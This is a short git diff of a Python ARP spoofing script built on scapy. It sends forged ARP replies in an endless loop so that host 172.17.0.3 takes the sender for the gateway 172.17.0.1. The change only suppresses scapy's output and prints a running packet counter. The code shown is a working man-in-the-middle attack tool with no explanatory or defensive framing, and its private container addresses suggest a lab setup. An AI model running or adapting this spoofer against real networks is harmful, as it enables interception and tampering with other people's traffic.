@@ -27,7 +27,7 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip,
                        hwdst='02:42:ac:11:00:03', psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
 sent_packet_count = 0
@@ -35,5 +35,6 @@ while True:
     spoof('172.17.0.3', '172.17.0.1')
     spoof('172.17.0.3', '172.17.0.1')
     sent_packet_count = sent_packet_count + 2
-    print('\r[+] Packets sent: ' + str(sent_packet_count))
+    print('\r[+] Packets sent: ' + str(sent_packet_count), end='')
+    sys.stdout.flush()
     time.sleep(2)
